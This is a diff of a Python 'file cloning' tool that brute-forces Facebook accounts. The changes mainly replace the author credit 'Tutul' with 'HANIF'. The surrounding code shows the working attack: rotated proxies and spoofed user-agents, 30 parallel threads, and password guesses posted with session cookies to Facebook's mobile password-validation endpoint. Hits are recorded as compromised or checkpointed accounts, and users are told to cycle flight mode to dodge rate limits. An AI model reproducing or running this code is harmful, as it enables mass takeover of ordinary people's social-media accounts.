@@ -10,7 +10,6 @@ from rich.console import Console as sol
 from bs4 import BeautifulSoup as sop
 from telegram.ext import Updater, CommandHandler
 import os
-import shutil
 from concurrent.futures import ThreadPoolExecutor as tred
 from rich.console import Group as gp
 from rich.panel import Panel as nel
@@ -20,9 +19,6 @@ from rich.columns import Columns as col
 from rich import print as rprint
 from rich import pretty
 from rich.text import Text as tekz
-import telegram
-from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
 pretty.install()
 CON=sol()
 #------------------[ USER-AGENT ]-------------------#
@@ -45,7 +41,7 @@ try:
 	open('.prox.txt','w').write(prox)
 	
 except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTutul')
+	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mHANIF')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -111,7 +107,7 @@ cokbrut=[]
 
 def back():
 	login()
-Tutul="Tutul"
+HANIF="HANIF"
 imt="SETU"
 ak="CLASS3-"
 
@@ -148,7 +144,7 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
 def alvino_xy(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def TUTULj(u):
+def HANIFj(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 def clear():
 	os.system('clear')
@@ -187,18 +183,18 @@ def banner():
 \033[0;91m------------------------------------------------\033[1;31m""")
 def login():
 	banner()
-	TUTULj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
-	TUTULj('\033[0;97m===============================================')
-	TUTUL= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
-	if TUTUL in ['m']:
+	HANIFj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
+	HANIFj('\033[0;97m===============================================')
+	HANIF= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
+	if HANIF in ['m']:
 		public()
-	elif TUTUL in ['1']:
+	elif HANIF in ['1']:
 		crack_file()
-	elif TUTUL in ['i','0i']:
+	elif HANIF in ['i','0i']:
 		result()
-	elif TUTUL in ['2','02']:
+	elif HANIF in ['2','02']:
 		os.system('xdg-open https://wa.me/+880161666363')
-	elif TUTUL in ['0']:
+	elif HANIF in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('#DONE LOGOUT ')
@@ -415,7 +411,7 @@ def passwrd():
 	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	TUTULj(f'\033[0;97m===============================================')
+	HANIFj(f'\033[0;97m===============================================')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -460,8 +456,8 @@ def passwrd():
 					
 				pool.submit(crack,idf,pwv)
 	print('')
-	TUTULj('==========================================')
-	TUTULj('CLONING COMPLETE .......... ')
+	HANIFj('==========================================')
+	HANIFj('CLONING COMPLETE .......... ')
 	print(f'{h}[{h}💚{h}]{h} Your Total OK idz : {h}%s '%(ok))
 	input('CLICK ENTER TO EXIT ')
 		
@@ -502,7 +498,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#HANIF
-				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Tutul-Cp] {idf} • {pw}')     
+				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•HANIF-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " C,  P"')
 			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
